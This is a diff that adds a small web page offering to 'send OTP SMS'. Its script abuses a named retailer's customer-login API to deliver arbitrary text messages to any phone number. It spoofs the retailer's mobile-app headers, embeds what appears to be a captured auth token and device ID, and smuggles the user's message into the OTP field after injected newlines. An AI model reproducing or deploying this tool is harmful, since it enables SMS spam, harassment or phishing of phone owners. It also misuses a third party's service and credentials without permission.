@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send OTP SMS MR.SHUVO</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        #form-container {
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+        }
+        input[type="text"], input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        #result {
+            margin-top: 20px;
+        }
+        .error {
+            color: red;
+        }
+        .success {
+            color: green;
+        }
+    </style>
+</head>
+<body>
+
+<div id="form-container">
+    <h1>Send OTP SMS BY-PROFESSOR</h1>
+    <form id="otpForm">
+        <label for="phone">Phone Number:</label>
+        <input type="text" id="phone" name="phone" placeholder="Enter phone number" required>
+        
+        <label for="message">Message:</label>
+        <input type="text" id="message" name="message" placeholder="Enter message" required>
+        
+        <input type="submit" value="Send Message">
+    </form>
+    
+    <div id="result"></div>
+</div>
+
+<script>
+document.getElementById('otpForm').addEventListener('submit', async function(event) {
+    event.preventDefault();
+    
+    const phone = document.getElementById('phone').value;
+    const message = document.getElementById('message').value;
+    const resultDiv = document.getElementById('result');
+    
+    resultDiv.innerHTML = ''; // Clear previous results
+
+    const url = "https://store-api.shwapno.com/en/api/customer/login";
+    const headers = {
+        "user-agent": "shwapno.flutter",
+        "accept-encoding": "gzip",
+        "nst": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOU1RfS0VZIjoiYm05d1UzUmhkR2x2YmxSdmEyVnUiLCJleHAiOjE3MjM5MTI1NTMsImlhdCI6MTcyMzgyNjE1M30.QGPgM5BvH0R2XBmbAEhPwxts0nZM1Ue8Tm8vmTdB7NE",
+        "content-length": "52",
+        "client-type": "App",
+        "host": "store-api.shwapno.com",
+        "content-type": "application/json",
+        "customer": "f7f1ffa2-1200-48e5-9434-b55da46a8981",
+        "device-type": "Mobile",
+        "appdevicetoken": "f7f1ffa2-1200-48e5-9434-b55da46a8981"
+    };
+
+    const data = {
+        phoneNumber: phone,
+        otpHash: "\n\n\n\n\n" + message
+    };
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify(data)
+        });
+
+        const responseData = await response.text();
+
+        if (response.ok) {
+            resultDiv.innerHTML = `<p class="success">Success: ${responseData}</p>`;
+        } else {
+            resultDiv.innerHTML = `<p class="error">Request failed with status code: ${response.status}</p>`;
+        }
+    } catch (error) {
+        resultDiv.innerHTML = `<p class="error">Network Error: ${error.message}</p>`;
+    }
+});
+</script>
+
+</body>
+</html>
